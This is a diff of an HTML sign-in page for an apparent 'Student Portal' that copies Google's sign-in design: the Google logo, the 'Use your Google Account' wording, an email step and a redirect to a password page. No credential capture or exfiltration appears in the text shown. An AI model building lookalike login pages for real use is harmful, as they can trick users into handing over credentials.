@@ -2,17 +2,19 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Sign in</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign in - Student Portal</title>
   <link rel="stylesheet" href="style.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
 </head>
 <body>
-
   <div class="page-center">
     <div class="card">
-
       <div class="logo">
-        <svg viewBox="0 0 48 48">
+        <!-- Keep your Google logo SVG – it's perfect -->
+        <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.14 1.53 7.56 2.8l5.5-5.5C33.64 3.6 29.22 1.5 24 1.5 14.98 1.5 7.2 6.68 3.44 14.24l6.66 5.18C11.84 13.3 17.42 9.5 24 9.5z"/>
           <path fill="#4285F4" d="M46.14 24.5c0-1.57-.14-3.08-.4-4.5H24v8.52h12.44c-.54 2.9-2.2 5.36-4.66 7.04l7.2 5.6c4.2-3.88 6.6-9.6 6.6-16.66z"/>
           <path fill="#FBBC05" d="M10.1 28.58c-.48-1.42-.76-2.94-.76-4.58s.28-3.16.76-4.58l-6.66-5.18C1.78 17.1.9 20.46.9 24s.88 6.9 2.54 9.76l6.66-5.18z"/>
@@ -21,32 +23,44 @@
       </div>
 
       <h1>Sign in</h1>
-      <p class="subtitle">to continue</p>
+      <p class="subtitle">Use your Google Account</p>
 
-      <input type="email" id="email" placeholder="Email or phone">
-      <div class="error-message" id="emailError"></div>
+      <form>
+        <input type="email" id="email" placeholder="Email or phone" autocomplete="email" required>
+        <div class="error-message" id="emailError"></div>
 
-      <a class="link" href="#">Forgot email?</a>
+        <a href="#" class="link">Forgot email?</a>
 
-      <div class="actions">
-        <button class="primary" onclick="nextStep()">Next</button>
-      </div>
+        <div class="create-account">
+          <a href="#" class="link">Create account</a>
+        </div>
 
+        <div class="actions">
+          <button type="button" class="primary" onclick="nextStep()">Next</button>
+        </div>
+      </form>
     </div>
   </div>
 
-  <div class="footer">
-    <span>English (United States)</span>
-    <span>Help · Privacy · Terms</span>
-  </div>
+  <footer class="footer">
+    <div class="lang-select">English (United States) ▼</div>
+    <div class="footer-links">Help · Privacy · Terms</div>
+  </footer>
 
   <script>
     function nextStep() {
       const email = document.getElementById("email").value.trim();
       const error = document.getElementById("emailError");
+      error.textContent = "";
 
       if (!email) {
         error.textContent = "Enter an email or phone number";
+        return;
+      }
+
+      // Very basic email check (you can improve later)
+      if (!email.includes("@")) {
+        error.textContent = "This doesn't look like an email";
         return;
       }
 
@@ -54,6 +68,5 @@
       window.location.href = "password.html";
     }
   </script>
-
 </body>
 </html>
